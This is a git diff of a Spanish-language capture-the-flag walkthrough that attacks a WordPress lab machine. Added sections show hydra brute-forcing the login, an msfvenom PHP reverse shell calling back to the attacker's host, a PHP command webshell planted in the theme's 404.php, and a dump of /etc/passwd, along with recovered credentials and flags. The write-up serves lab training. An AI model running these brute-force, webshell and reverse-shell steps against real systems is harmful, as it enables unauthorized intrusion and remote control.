@@ -175,11 +175,13 @@ nikto -h 10.0.2.18:80
 #### Resumen de resultados de la exploracion de directorios y ficheros
 
 Se ha localizado lo siguiente que puede ser muy interesante de comprobar:
-- archivo robots.txt
+
+- archivo /robots.txt
 - instalacion WordPress
   - /wordpress/wp-login.php Login de wordpress en pagina por defecto. (wp-login.php).
   - Archivo wp-config.php que podria contener las credenciales.
   - Archivo wp-links-opml.php que podria mostrar la version instalada.  
+- archivo /license.txt
 
 #### Comprobacion de los hallazgos de la exploracion en el puerto 80
 
@@ -230,30 +232,22 @@ Obtengo la primera flag: **[073403c8a58a1f80d943455fb30724b9]**
 ##### Comprobacion de la instalacion Wordpress
 
 Otro de los hallazgos ha sido que parece haber un Wordpress instalado en el servidor.
+
+Compruebo el acceso atraves del navegador
+
+![alt text](image-23.png)
+
 El archivo `wp-links-opml.php` pacere que revela la version instalada de wordpress.
 
 ![alt text](image-20.png)
 
 Al comprobarlo nos da la version 4.3.33 de WordPress.
 
-
-
-
-
-
-Compruebo acceso
-
-![alt text](image-2.png)
-
-![alt text](image-3.png)
-
-![alt text](image-4.png)
-
-
 **Escaneo WPSCAN**
 
-```
-wpscan --url http://10.0.2.6 
+
+```bash
+wpscan --url http://10.0.2.18 
 ```
 
 ![WPScan](image-21.png)
@@ -266,7 +260,212 @@ sort fsocity.dic | uniq | wc -l
 
 ![alt text](image-22.png)
 
-Con esto he obtenido un diccionario sin repeticiones de solo 11451 lineas, mucho mas manejable que las 
+Vemos que se obtienen 11451 lineas unicas. Asi que creamos un fichero fsocity.dic.uniq con el comando 
+
+
+```bash
+sort fsocity.dic | uniq > fsocity.dic.uniq
+```
+
+![alt text](image-24.png)
+
+Con esto he obtenido un diccionario sin repeticiones de solo 11451 lineas, mucho mas manejable que las 858160 lineas originales.
+
+Voy a intentar realizar fuerza bruta contra el login de wordpress usando hydra con el diccionario mejorado.
+
+Tiro el comando siguiente con el que realizo un ataque usando la clave "wedontcare" (no me importa) ya que lo que busco es saber el usuario para poder despues intentar romper su clave.
+
+```bash
+hydra -vV -L fsocity.dic.uniq -p wedontcare 10.0.2.18 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
+```
+
+![alt text](image-25.png)
+
+Encuentro un nombre valido con este diccionario: **elliot**
+
+![alt text](image-26.png)
+
+Uso hydra de nuevo para intentar romper la clave del usuario intentando la fuerza bruta con el mismo diccionario.
+
+```bash
+hydra -vV -l elliot -P fsocity.dic.uniq 10.0.2.18 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
+```
+
+![alt text](image-27.png)
+
+Al poco tiempo de comenzar el ataque se detecta la contraseña del usuario: **ER28-0652**
+
+![alt text](image-28.png)
+
+He conseguido las siguientes credenciales:
+
+Usuario | Password
+--------|----------
+elliot  | ER28-0652
+
+##### Comprobacion de archivo license.txt
+
+Descargo el fichero license.txt con el comando wget 10.0.2.18:80/license.txt
+
+![alt text](image-32.png)
+
+Una vez descargado compruebo el fichero.
+
+
+
+
+Con estas claves puedo acceder al panel de administracion de wordpress, pero lo mas importante es que con esta credencial y usando el exploit adecuado podria cargar una shell.
+
+Para lograr esto puedo buscar en metasploit para comprobar si existe un exploit para wordpress que me permita cargar una shell.
+
+Cargo metasploit con `msfconsole` y realizo una busqueda con `search wordpress shell` y obtengo los siguientes resultados
+
+![alt text](image-29.png)
+
+Voy a usar `exploit/unix/webapp/wp_admin_shell_upload`, compruebo las opciones a configurar para poder realizar con exito el ataque.
+
+![alt text](image-30.png)
+
+Defino el nombre de usuario, la clave y el host remoto.
+
+```bash
+set USERNAME elliot
+set PASSWORD ER28-0652
+set RHOST 10.0.2.18
+```
+
+![alt text](image-31.png)
+
+Creo una shell reversa desde msfvenom que apunte a mi maquina kali y al puerto 4444 con el comando:
+
+```bash
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.2.14 LPORT=4444 -f raw > /home/kali/desktop/mi_reverse_shell.php
+```
+
+![alt text](image-33.png)
+
+Con el acceso al panel de administracion de wordpress subo el fichero generado.
+
+![alt text](image-34.png)
+
+![alt text](image-36.png)
+
+![alt text](image-35.png)
+
+![alt text](image-37.png)
+
+![alt text](image-38.png)
+
+![alt text](image-39.png)
+
+No he podido aun realizar la carga de mi shell en la web ya que todas me exigen un formato de archivo en concreto. 
+
+Se me ha ocurrido modificar un archivo legitimo del tema para que cuando cargue se ejecute la shell. Para ello voy a la seccion donde estan los temas, busco el tema activado y busco un archivo que solo se ejecute bajo ciertas circunstancias como puede ser una pagina 404 de error preestablecida.
+
+
+![alt text](image-40.png)
+
+Añado una minishell para ejecutar comandos que pase como parametros en la direccion de la pagina.
+
+```php
+<?php
+if(isset($_REQUEST['cmd'])){
+echo "<pre>";
+$cmd = ($_REQUEST['cmd']);
+system($cmd);
+echo "</pre>";
+die;
+}
+?>
+```
+
+![alt text](image-43.png)
+
+Compruebo que funciona la nueva pagina 404.php y que carga un mensaje de como usar la minishell
+
+![alt text](image-42.png)
+
+Ejecuto un list de ficheros para comprobar el funcionamiento de la minishell y aparece el listado de ficheros del servidor.
+
+![alt text](image-44.png)
+
+Pruebo a leer el fichero passwd y compruebo que puedo verlo 
+
+![alt text](image-45.png)
+
+```bash
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:x:100:101::/var/lib/libuuid:
+syslog:x:101:104::/home/syslog:/bin/false
+sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
+ftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/false
+bitnamiftp:x:1000:1000::/opt/bitnami/apps:/bin/bitnami_ftp_false
+mysql:x:1001:1001::/home/mysql:
+varnish:x:999:999::/home/varnish:
+robot:x:1002:1002::/home/robot:
+```
+
+Esta shell se me queda algo pequeña, por lo que busco en google php reverse shell y encuentro el [github de pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell.git)
+
+Clono el repositorio para usarlo
+
+```bash
+git clone https://github.com/pentestmonkey/php-reverse-shell.git
+```
+
+![alt text](image-46.png)
+
+![alt text](image-47.png)
+
+Edito el fichero php-reverse-shell.php y veo que viene especificado en su interior que debo modificar.
+
+![alt text](image-48.png)
+
+Cambio los valores para las variables ip y puerto, por la ip de mi maquina kali y un puerto libre en mi maquina.
+
+![alt text](image-49.png)
+
+Una vez modificado los valores copio el contenido del fichero php-reverse-shell.php y lo pego en el fichero 404.php
+
+Pongo mi maquina a la escucha en el puerto 4444
+
+![alt text](image-50.png)
+
+Y ahora visito la pagina 404.php para ejecutar la shell
+
+
+
+
+
+---
+---
+---
+---
+
+Compruebo acceso
+
+![alt text](image-2.png)
+
+
+
+
 
 
 └─$ wpscan --url http://10.0.2.6 -P /home/kali/Downloads/fsocity.dic  -U 'elliot'
@@ -407,3 +606,7 @@ firstboot_done key-3-of-3.txt
 04787ddef27c3dee1ee161b21670b4e4
 
 
+
+![alt text](image-4.png)
+
+![alt text](image-3.png)
